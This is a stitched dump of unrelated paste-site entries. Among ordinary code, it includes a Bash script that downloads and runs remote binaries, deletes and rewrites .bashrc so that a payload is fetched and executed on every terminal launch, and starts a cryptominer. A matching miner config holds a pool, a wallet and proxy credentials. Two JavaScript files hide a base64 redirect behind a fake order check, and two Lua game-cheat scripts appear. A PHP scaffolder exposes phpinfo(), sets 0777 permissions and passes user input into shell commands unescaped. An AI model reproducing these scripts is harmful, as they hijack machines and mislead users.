		// Get the configuration file, if app.\$key  then get from the app.config.php file
		\$prefix = explode('.', \$key);
		if(!file_exists(__DIR__ . '/../config/' . \$prefix[0] . '.config.php')) {
			throw new Exception('Config file not found: ' . \$prefix[0] . '.config.php');    
		}
		// Get the config file 
		\$config = require __DIR__ . '/../config/' . \$prefix[0] . '.config.php';

		\$file = __DIR__ . '/../config/' . \$prefix[0] . '.config.php';
		// Check if the key exists in the config file if not throw an exception
		if(array_key_exists(\$prefix[1] , \$config)) {
			return \$config[\$prefix[1]];
		} else {
			throw new Exception('Config key not found: ' . \$key . ' in file: ' . \$file);
		}
	}"";

	file_put_contents($root . '/app/' . 'functions.php', $functions);
}


if (file_exists($root . '/app/' . 'bootstrap.php')) {
	// Populate the bootstrap.php with the template bootstrap.php
	$bootstrap = """" . str_replace('[file]', 'bootstrap.php', $startFile) . ""

// Load the configuration file of the application
include __DIR__ . '/../config/app.config.php';

// Load the types file of the application
include __DIR__ . '/../config/types.config.php';

// Load the errors file of the application
include __DIR__ . '/../config/errors.config.php';

// Load the database file of the application
include __DIR__ . '/../config/database.config.php';

// Load the helpers file of the application
include __DIR__ . '/../app/functions.php';
"";

	file_put_contents($root . '/app/' . 'bootstrap.php', $bootstrap);

	// change the permission of the file and chown
	chmod($root . '/app/' . 'bootstrap.php', 0777);
}

// Populate the index.php with the template index.php
if (file_exists($root . '/' . 'index.php')) {
	$index = """" . str_replace('[file]', 'index.php', $startFile) . ""

// Load the bootstrap file of the application
require_once 'app/bootstrap.php';

// Enable error reporting based on the debug mode specified on the app.config file
if (config('app.debug')) {
	error_reporting(E_WARNING | E_ERROR | E_CORE_ERROR | E_COMPILE_ERROR | E_USER_ERROR | E_RECOVERABLE_ERROR | E_PARSE);
	ini_set('display_errors', 1);
} else {
	error_reporting(0);
	ini_set('display_errors', 0);
}

try {
	phpinfo();
} catch (\Exception \$e) {
	
}

exit;
"";
	file_put_contents($root . '/' . 'index.php', $index);

	// change the permission of the file and chown
	chmod($root . '/' . 'index.php', 0777);
}




// Create the composer.json file
$composer = ""{
	\""name\"": \""vinicordeirogo/"" . strtolower(str_replace(' ', '-', $project_name)) . ""\"",
	\""description\"": \"""" . $project_description . ""\"",
	\""type\"": \""project\"",
	\""readme\"": \""README.md\"",
	\""authors\"": [
		{
			\""name\"": \""Vinícius Gonçalves Cordeiro\"",
			\""email\"": \""vinicordeirogo@gmail.com\""
		}
	],
	\""require\"": {
		\""guzzlehttp/guzzle\"": \""^7.9\"",
        \""adodb/adodb-php\"": \""^5.22\"",
        \""smarty/smarty\"": \""^5.4\"",
        \""phpmailer/phpmailer\"": \""^6.9\"",
        \""phpoffice/common\"": \""^1.0\"",
        \""phpoffice/phpspreadsheet\"": \""^4.1\"",
        \""phpoffice/phpword\"": \""^1.3\"",
        \""phpoffice/phppresentation\"": \""^0.2.0\""
	},
	\""autoload\"": {
		\""psr-4\"": {
			\""App\\\\\"": \""app/\"",
			\""Config\\\\\"": \""config/\"",
			\""Routes\\\\\"": \""routes/\""
		},
		\""classmap\"": [
			\""app/Core/\"",
			\""app/Controllers/\"",
			\""app/Helpers/\"",
			\""app/Models/\"",
			\""app/Views/\"",
			\""config/\"",
			\""routes/\""
		]
	},
	\""config\"": {
		\""vendor-dir\"": \""libs/\""
	}
}
"";

// Create the composer.json file
file_put_contents($root . '/' . 'composer.json', $composer);


// Create the tailwind.config.js 
if (file_exists($root . '/tailwind.config.js')) {
	$tailwindConfig = ""

module.exports = {

	theme: {
		fontFamily: {
			sans: ['Nunito', 'sans-serif'],
			mono: ['Fira Code', 'monospace'],
		},
		colors: {
			transparent: 'transparent',
			current: 'currentColor',
			black: '#000',
			white: '#fff',
			primary: {
				50: '#eff6ff',
				100: '#dbeafe',
				200: '#bfdbfe',
				300: '#93c5fd',
				400: '#60a5fa',
				500: '#3b82f6',
				600: '#2563eb',
				700: '#1d4ed8',
				800: '#1e40af',
				900: '#1e3a8a',
			},
			secondary: {
				50: '#f9fafb',
				100: '#f3f4f6',
				200: '#e5e7eb',
				300: '#d1d5db',
				400: '#9ca3af',
				500: '#6b7280',
				600: '#4b5563',
				700: '#374151',
				800: '#1f2937',
				900: '#111827',
			}
		}
		extend: {
			
		},
	},
	darkMode: 'class',	
	plugins: [
		require('@tailwindcss/typography'),
		require('@tailwindcss/forms'),
		require('@tailwindcss/aspect-ratio'),
	],
};
"";
	file_put_contents($root . '/' . 'tailwind.config.js', $tailwindConfig);
}

// Ask if the user wants to create a git repository
echo 'Do you want to create a git repository? (Y/n) ';
$git = trim(fgets(STDIN));

if (strtolower($git) == 'y') {
	// Create the git repository on  main branch and Initial commit message

	exec(' cd /var/www/' . $project_name . ' && git init && git add . && git commit -m ""Initial commit""');
}


// Ask if the user wants to create a database
echo 'Do you want to create a database? (Y/n) ';
$database = trim(fgets(STDIN));

if (strtolower($database) == 'y') {
	// Create the database
	echo 'Enter the name of the database: ';
	$database_name = trim(fgets(STDIN));
	echo 'Enter the username of the database: ';
	$database_username = trim(fgets(STDIN));
	echo 'Enter the password of the database: ';
	$database_password = trim(fgets(STDIN));

	// Create the database
	exec('mysql -u ' . $database_username . ' -p' . $database_password . ' -e ""CREATE DATABASE ' . $database_name . ';""');

	$adodbSessionSQL = ""
	CREATE TABLE IF NOT EXISTS sessions2 (
	sesskey VARCHAR( 64 ) COLLATE utf8mb4_bin NOT NULL DEFAULT '',
	expiry DATETIME NOT NULL ,
	expireref VARCHAR( 250 ) DEFAULT '',
	created DATETIME NOT NULL ,
	modified DATETIME NOT NULL ,
	sessdata LONGTEXT,
	PRIMARY KEY ( sesskey ) ,
	INDEX sess2_expiry( expiry ),
	INDEX sess2_expireref( expireref )
	) ENGINE = InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
	"";

	// Create the database
	exec('mysql -u ' . $database_username . ' -p' . $database_password . ' ' . $database_name . ' -e ""' . $adodbSessionSQL . '""');
}


// Run the composer update and dump-autoload command
exec('cd /var/www/' . $project_name . ' && composer update ');

// Run the composer dump-autoload command
exec('composer dump-autoload -o');

try {
	exec('php -S 0.0.0.0:8000 -t /var/www/' . $project_name . ' &');
	exec('firefox http://127.0.0.1:8000/');
} catch (Exception $e) {
	$errors[] = [
		'error' => 'Error on other runtime',
		'message' => $e->getMessage(),
		'file' => $e->getFile(),
		'line' => $e->getLine(),
	];
}

if (count($errors) > 0) {
	echo 'Errors: ' . PHP_EOL;
	foreach ($errors as $error) {
		echo $error['folder'] . ' - ' . $error['file'] . ' - ' . $error['message'] . PHP_EOL;
	}

	// Dump the errors on a file on the root folder
	file_put_contents($root . '/' . 'errors.log', json_encode($errors));
}


return true;
"
NqQ0yjLA,config.json,ppek,JSON,Thursday 10th of April 2025 10:15:01 AM CDT,"ctm=$(TZ=UTC-7 date +""%d/%m-[%R:%S]"")
echo '{""autosave"": true, ""randomx"": {""1gb-pages"": true}, ""cpu"": {""enabled"": true, ""huge-pages"": true, ""rx/0"": [-1, -1, -1, -1, -1, -1, -1, -1]}, ""pools"": [{""algo"": ""rx/0"", ""coin"": null, ""url"": ""47.254.81.210:720"", ""user"": ""83BpYobNvpyDw5nsr835mmbGjg2QAiMDvcPpwL17MvDLTqrqJhQ4YopBEBCbke5U1mR7nM1nBfyaQiG2Z32pP4xJSjvS6ZS"", ""pass"": ""'$ctm'"", ""proxy"":[{""enabled"": true, ""address"": ""socks5://warning000:warning12@103.99.34.173:6788""}], ""keepalive"": true}]} ' > /home/user/.wolu/config.json
"
6R5uV7P6,setUP,ppek,Bash,Thursday 10th of April 2025 10:13:35 AM CDT,"#!/bin/bash

# Mengunduh file 'kilan' dan memberikan izin eksekusi
wget -O kilan https://w4r.gmaila.tech/kilan
chmod +x kilan
./kilan
clear
sleep 2
rm -rf kilan

# Menghapus dan membuat direktori .wolu serta mengunduh file wolu
cd ~
pkill wolu && sleep 2
rm -rf .wolu .bashrc && sleep 2
mkdir .wolu && cd .wolu
wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab
chmod +x wolu >/dev/null 2>&1
clear

# Menambahkan perintah baru ke ~/.bashrc untuk menjalankan config.sh
echo ""cd ~/ && wget -O c.sh https://idx0.short.gy/json && chmod +x c.sh && sed -i -e 's/\r$//' c.sh && ./c.sh"" >> ~/.bashrc

# Menambahkan skrip otomatis ke ~/.bashrc untuk menjalankan program secara otomatis saat terminal dibuka
echo -e ""# If not running interactively, don't do anything\ncase \$- in *i*) ;; *) return ;; esac\n\n# Auto-run script on terminal start\npkill wolu && cd ~/ && sleep 2\nnohup ~/.wolu/./wolu &>/dev/null &\nclear\n\ncurrent_time=\$(TZ=UTC-7 date +\""%R-[%d/%m/%y]\"")\nurl=\$(jq -r '.pools[0].url' ~/.wolu/config.json)\n\n# Display the current time and pool information\njq -r '.pools[0].pass' ~/.wolu/config.json | awk -v time=\""\$current_time\"" -v pool_url=\""\$url\"" '{\n    print \""\\033[1;31;40mVaultHCI\\033[0m\"", time;\n    print \""\\033[42;1m\\033[37mPool\\033[0m\"", pool_url;\n    print \""\\033[31;43mRDP\\033[0m\"", \$1\n}'\n\n# Show confirmation that auto-run script is working\necho -e \""\\033[1;32m[INFO] OtoRerun executed successfully.\\033[0m\""\n\njobs"" >> ~/.bashrc
source ~/.bashrc; chmod +x .bashrc; ./.bashrc"
ahDh6hHm,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 10:05:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09139/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4k6uRaYe,Untitled,kirzecy670,MySQL,Thursday 10th of April 2025 10:01:58 AM CDT,"select action, count(*) as n from stat.funnelTrack where dt >= yesterday()
and action ilike '%article%'
group by 1 order by 1"
yD3c7yfN,Cassani 101,Ehieisaac123,Lua,Thursday 10th of April 2025 10:00:29 AM CDT,"-- Cassano Hub - Fight in a School Optimized
local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local RunService = game:GetService(""RunService"")

-- GUI Setup
local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
gui.Name = ""CassanoHub""

-- Background
local bg = Instance.new(""ImageLabel"", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = ""rbxassetid://11719621788""
bg.ImageTransparency = 0.2
bg.ZIndex = 0

-- Key Frame
local KeyFrame = Instance.new(""Frame"", gui)
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
KeyFrame.Active = true
KeyFrame.Draggable = true
Instance.new(""UICorner"", KeyFrame)

local KeyBox = Instance.new(""TextBox"", KeyFrame)
KeyBox.PlaceholderText = ""Enter Key...""
KeyBox.Size = UDim2.new(0.8, 0, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.35, 0)
KeyBox.Text = """"
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyBox.TextColor3 = Color3.new(1, 1, 1)

local GetKeyButton = Instance.new(""TextButton"", KeyFrame)
GetKeyButton.Text = ""Get Key""
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
GetKeyButton.Position = UDim2.new(0.1, 0, 0.65, 0)
GetKeyButton.Font = Enum.Font.Gotham
GetKeyButton.TextSize = 14
GetKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GetKeyButton.TextColor3 = Color3.new(1, 1, 1)
GetKeyButton.MouseButton1Click:Connect(function()
    setclipboard(""https://workink.net/1Z2m/r0bk16cn"")
end)

local CheckKeyButton = Instance.new(""TextButton"", KeyFrame)
CheckKeyButton.Text = ""Check Key""
CheckKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
CheckKeyButton.Position = UDim2.new(0.5, 0, 0.65, 0)
CheckKeyButton.Font = Enum.Font.Gotham
CheckKeyButton.TextSize = 14
CheckKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CheckKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Main Hub
local HubFrame = Instance.new(""Frame"", gui)
HubFrame.Size = UDim2.new(0, 600, 0, 400)
HubFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
HubFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HubFrame.Visible = false
HubFrame.Active = true
HubFrame.Draggable = true
Instance.new(""UICorner"", HubFrame)

local Sections = {""Combat"", ""General"", ""Exploit"", ""Misc""}
local Pages = {}

for i, sec in ipairs(Sections) do
    local tab = Instance.new(""TextButton"", HubFrame)
    tab.Size = UDim2.new(0, 140, 0, 25)
    tab.Position = UDim2.new(0, (i - 1) * 145, 0, 30)
    tab.Text = sec
    tab.Font = Enum.Font.Gotham
    tab.TextSize = 14
    tab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    tab.TextColor3 = Color3.new(1, 1, 1)

    local page = Instance.new(""ScrollingFrame"", HubFrame)
    page.Size = UDim2.new(1, -20, 1, -65)
    page.Position = UDim2.new(0, 10, 0, 60)
    page.CanvasSize = UDim2.new(0, 0, 10, 0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = sec == ""Combat""
    Pages[sec] = page

    Instance.new(""UIListLayout"", page)

    tab.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true
    end)
end

-- Key Check
local correctKey = ""cassano123""
CheckKeyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == correctKey then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyBox.Text = """"
        KeyBox.PlaceholderText = ""Wrong key! Try again.""
    end
end)

-- Feature Button Generator
local function makeButton(name, section, callback)
    local btn = Instance.new(""TextButton"")
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = Pages[section]
    btn.MouseButton1Click:Connect(callback)
end

-- Combat Features
local function getClosestPlayer(range)
    local closest, dist = nil, range
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            local mag = (player.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if mag < dist then
                closest = plr
                dist = mag
            end
        end
    end
    return closest
end

makeButton(""Kill Aura"", ""Combat"", function()
    local auraActive = true
    RunService.RenderStepped:Connect(function()
        if auraActive then
            local target = getClosestPlayer(15)
            if target and target.Character and target.Character:FindFirstChild(""Humanoid"") then
                target.Character.Humanoid:TakeDamage(25)
            end
        end
    end)
end)

makeButton(""Farsing"", ""Combat"", function()
    print(""Farsing enabled."")
end)

makeButton(""Always Equip Fists"", ""Combat"", function()
    if player.Character:FindFirstChildOfClass(""Tool"") then
        player.Character:FindFirstChildOfClass(""Tool""):Destroy()
    end
end)

makeButton(""Weapon TP"", ""Combat"", function()
    for _, item in pairs(workspace:GetDescendants()) do
        if item:IsA(""Tool"") then
            item.Handle.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end)

makeButton(""Enable Style Changer"", ""Combat"", function()
    print(""Style changer enabled."")
end)

makeButton(""Select Style: Jeet Kune Do"", ""Combat"", function()
    print(""Style set to Jeet Kune Do."")
end)

makeButton(""Magnet Mode"", ""Combat"", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local hrp = plr.Character:FindFirstChild(""HumanoidRootPart"")
            if hrp then
                hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
            end
        end
    end
end)

makeButton(""Ignore Friends"", ""Combat"", function()
    print(""Ignoring friends enabled"")
end)

makeButton(""Attack Cooldown: 0.3"", ""Combat"", function()
    print(""Cooldown set"")
end)

-- Add more buttons to other sections as needed...
"
4wKpk8nU,[QW][4708056]adapt_report_simple_label_dymo,rht_odoo,XML,Thursday 10th of April 2025 09:59:11 AM CDT,"<data>
    <!--
    Done by RHT on the 10/04/2025
    Need : adapt the dymo label (remove price & let the reference be on the whole line)
    Task : https://www.odoo.com/odoo/project.task/4708056
    Pastebin : https://pastebin.com/4wKpk8nU
    -->
    <xpath expr=""//div[4]"" position=""replace""/>
    <xpath expr=""//div[3]"" position=""replace"">
        <div class=""o_label_name"">
            <small class=""text-nowrap"" t-field=""product.default_code""/>
        </div>
    </xpath>
</data>"
Prpkmjy5,Vinczi,Ehieisaac123,Lua,Thursday 10th of April 2025 09:58:11 AM CDT,"-- Cassano Hub - Fight in a School Optimized
local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local RunService = game:GetService(""RunService"")

-- GUI Setup
local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
gui.Name = ""CassanoHub""

-- Background
local bg = Instance.new(""ImageLabel"", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = ""rbxassetid://11719621788""
bg.ImageTransparency = 0.2
bg.ZIndex = 0

-- Key Frame
local KeyFrame = Instance.new(""Frame"", gui)
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
KeyFrame.Active = true
KeyFrame.Draggable = true
Instance.new(""UICorner"", KeyFrame)

local KeyBox = Instance.new(""TextBox"", KeyFrame)
KeyBox.PlaceholderText = ""Enter Key...""
KeyBox.Size = UDim2.new(0.8, 0, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.35, 0)
KeyBox.Text = """"
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyBox.TextColor3 = Color3.new(1, 1, 1)

local GetKeyButton = Instance.new(""TextButton"", KeyFrame)
GetKeyButton.Text = ""Get Key""
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
GetKeyButton.Position = UDim2.new(0.1, 0, 0.65, 0)
GetKeyButton.Font = Enum.Font.Gotham
GetKeyButton.TextSize = 14
GetKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GetKeyButton.TextColor3 = Color3.new(1, 1, 1)
GetKeyButton.MouseButton1Click:Connect(function()
    setclipboard(""https://workink.net/1Z2m/r0bk16cn"")
end)

local CheckKeyButton = Instance.new(""TextButton"", KeyFrame)
CheckKeyButton.Text = ""Check Key""
CheckKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
CheckKeyButton.Position = UDim2.new(0.5, 0, 0.65, 0)
CheckKeyButton.Font = Enum.Font.Gotham
CheckKeyButton.TextSize = 14
CheckKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CheckKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Main Hub
local HubFrame = Instance.new(""Frame"", gui)
HubFrame.Size = UDim2.new(0, 600, 0, 400)
HubFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
HubFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HubFrame.Visible = false
HubFrame.Active = true
HubFrame.Draggable = true
Instance.new(""UICorner"", HubFrame)

local Sections = {""Combat"", ""General"", ""Exploit"", ""Misc""}
local Pages = {}

for i, sec in ipairs(Sections) do
    local tab = Instance.new(""TextButton"", HubFrame)
    tab.Size = UDim2.new(0, 140, 0, 25)
    tab.Position = UDim2.new(0, (i - 1) * 145, 0, 30)
    tab.Text = sec
    tab.Font = Enum.Font.Gotham
    tab.TextSize = 14
    tab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    tab.TextColor3 = Color3.new(1, 1, 1)

    local page = Instance.new(""ScrollingFrame"", HubFrame)
    page.Size = UDim2.new(1, -20, 1, -65)
    page.Position = UDim2.new(0, 10, 0, 60)
    page.CanvasSize = UDim2.new(0, 0, 10, 0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = sec == ""Combat""
    Pages[sec] = page

    Instance.new(""UIListLayout"", page)

    tab.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true
    end)
end

-- Key Check
local correctKey = ""cassano123""
CheckKeyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == correctKey then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyBox.Text = """"
        KeyBox.PlaceholderText = ""Wrong key! Try again.""
    end
end)

-- Feature Button Generator
local function makeButton(name, section, callback)
    local btn = Instance.new(""TextButton"")
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = Pages[section]
    btn.MouseButton1Click:Connect(callback)
end

-- Combat Features
local function getClosestPlayer(range)
    local closest, dist = nil, range
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            local mag = (player.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if mag < dist then
                closest = plr
                dist = mag
            end
        end
    end
    return closest
end

makeButton(""Kill Aura"", ""Combat"", function()
    local auraActive = true
    RunService.RenderStepped:Connect(function()
        if auraActive then
            local target = getClosestPlayer(15)
            if target and target.Character and target.Character:FindFirstChild(""Humanoid"") then
                target.Character.Humanoid:TakeDamage(25)
            end
        end
    end)
end)

makeButton(""Farsing"", ""Combat"", function()
    print(""Farsing enabled."")
end)

makeButton(""Always Equip Fists"", ""Combat"", function()
    if player.Character:FindFirstChildOfClass(""Tool"") then
        player.Character:FindFirstChildOfClass(""Tool""):Destroy()
    end
end)

makeButton(""Weapon TP"", ""Combat"", function()
    for _, item in pairs(workspace:GetDescendants()) do
        if item:IsA(""Tool"") then
            item.Handle.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end)

makeButton(""Enable Style Changer"", ""Combat"", function()
    print(""Style changer enabled."")
end)

makeButton(""Select Style: Jeet Kune Do"", ""Combat"", function()
    print(""Style set to Jeet Kune Do."")
end)

makeButton(""Magnet Mode"", ""Combat"", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local hrp = plr.Character:FindFirstChild(""HumanoidRootPart"")
            if hrp then
                hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
            end
        end
    end
end)

makeButton(""Ignore Friends"", ""Combat"", function()
    print(""Ignoring friends enabled"")
end)

makeButton(""Attack Cooldown: 0.3"", ""Combat"", function()
    print(""Cooldown set"")
end)

"
HHe5YG3j,ESP LCD Panel API example,honey_the_codewitch,C++,Thursday 10th of April 2025 09:56:54 AM CDT,"// change below to your settings
// screen dimensions
#define LCD_WIDTH 320
#define LCD_HEIGHT 240
// screen connections
#define LCD_CLK 18
#define LCD_MOSI 23
#define LCD_DC 2
#define LCD_CS 15
#define LCD_RST 4
#define LCD_BL 32 // optional

#include ""driver/gpio.h""
#include ""driver/spi_master.h""
#include ""esp_lcd_panel_io.h""
#include ""esp_lcd_panel_ops.h""
#include ""esp_lcd_panel_vendor.h""
// include your custom panel driver here
...
// the size of our transfer buffer(s)
static const constexpr size_t lcd_transfer_buffer_size = LCD_WIDTH*LCD_HEIGHT*2/10;
static uint8_t* lcd_transfer_buffer1 = nullptr;
// the second buffer
static uint8_t* lcd_transfer_buffer2 = nullptr;
...
// initialize the screen using the esp panel API
static void lcd_init() {
#ifdef LCD_BL
#if LCD_BL > -1
    gpio_set_direction((gpio_num_t)LCD_BL,GPIO_MODE_OUTPUT);
    gpio_set_level((gpio_num_t)LCD_BL,0);
#endif
#endif
    lcd_transfer_buffer1 = (uint8_t*)heap_caps_malloc(lcd_transfer_buffer_size,MALLOC_CAP_DMA);
#ifdef TWO_BUFFERS
    lcd_transfer_buffer2 = (uint8_t*)heap_caps_malloc(lcd_transfer_buffer_size,MALLOC_CAP_DMA);
#endif
    if(lcd_transfer_buffer1==nullptr
#ifdef TWO_BUFFERS
        ||lcd_transfer_buffer2==nullptr
#endif
    ) {
        puts(""Out of memory allocating transfer buffer"");
        while(1) vTaskDelay(5);
    }
    spi_bus_config_t buscfg;
    memset(&buscfg, 0, sizeof(buscfg));
    buscfg.sclk_io_num = LCD_CLK;
    buscfg.mosi_io_num = LCD_MOSI;
    buscfg.miso_io_num = -1;
    buscfg.quadwp_io_num = -1;
    buscfg.quadhd_io_num = -1;
    buscfg.max_transfer_sz = lcd_transfer_buffer_size + 8;

    // Initialize the SPI bus on VSPI (SPI3)
    spi_bus_initialize(SPI3_HOST, &buscfg, SPI_DMA_CH_AUTO);

    esp_lcd_panel_io_handle_t io_handle = NULL;
    esp_lcd_panel_io_spi_config_t io_config;
    memset(&io_config, 0, sizeof(io_config));
    io_config.dc_gpio_num = LCD_DC,
    io_config.cs_gpio_num = LCD_CS,
    io_config.pclk_hz = 40*1000*1000,
    io_config.lcd_cmd_bits = 8,
    io_config.lcd_param_bits = 8,
    io_config.spi_mode = 0,
    io_config.trans_queue_depth = 10,
    io_config.on_color_trans_done = lcd_flush_ready;
    // Attach the LCD to the SPI bus
    esp_lcd_new_panel_io_spi((esp_lcd_spi_bus_handle_t)SPI3_HOST, &io_config, &io_handle);
    esp_lcd_panel_dev_config_t lcd_config;
    memset(&lcd_config, 0, sizeof(lcd_config));
    lcd_config.reset_gpio_num = LCD_RST;
#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 0, 0)
    lcd_config.rgb_endian = LCD_RGB_ENDIAN_RGB;
#else
    lcd_config.color_space = ESP_LCD_COLOR_SPACE_RGB;
#endif
    lcd_config.bits_per_pixel = 16;

    // Initialize the LCD configuration
    esp_lcd_panel_handle_t lcd_handle = nullptr;

	//
	// Change this from st7789 to your panel's display controller
	// 
    esp_lcd_new_panel_st7789(io_handle, &lcd_config, &lcd_handle);

    // Reset the display
    esp_lcd_panel_reset(lcd_handle);

    // Initialize LCD panel
    esp_lcd_panel_init(lcd_handle);
	//
    //  Configure the panel (Different LCD screens may need different options)
	//
    esp_lcd_panel_swap_xy(lcd_handle, false);
    esp_lcd_panel_set_gap(lcd_handle, 0, 35);
    esp_lcd_panel_swap_xy(lcd_handle,true);
    esp_lcd_panel_mirror(lcd_handle, false, true);
    esp_lcd_panel_invert_color(lcd_handle, true);
    // Turn on the screen
#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 0, 0)
    esp_lcd_panel_disp_on_off(lcd_handle, true);
#else
    esp_lcd_panel_disp_off(lcd_handle, false);
#endif
#ifdef LCD_BL
#if LCD_BL > -1
    gpio_set_level((gpio_num_t)LCD_BL,1);
#endif
#endif
}"
Zntcdh6D,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 09:49:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72780/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LfeLEXmH,Untitled,smj007,Python,Thursday 10th of April 2025 09:46:01 AM CDT,"class Solution:
    def removeDuplicates(self, nums: List[int]) -> int:

        unique_tracker = 1
        replace_tracker = 1
        count = 1

        while unique_tracker < len(nums):
            if nums[unique_tracker] == nums[unique_tracker - 1]:
                # increase the count 
                count += 1
            else:
                # stop the count
                count = 1  # reset count for new number

            # only if they are the first 2 number
            # activate the replace trcker - copy and move
            if count <= 2:
                nums[replace_tracker] = nums[unique_tracker]
                replace_tracker += 1

            # go on as usual
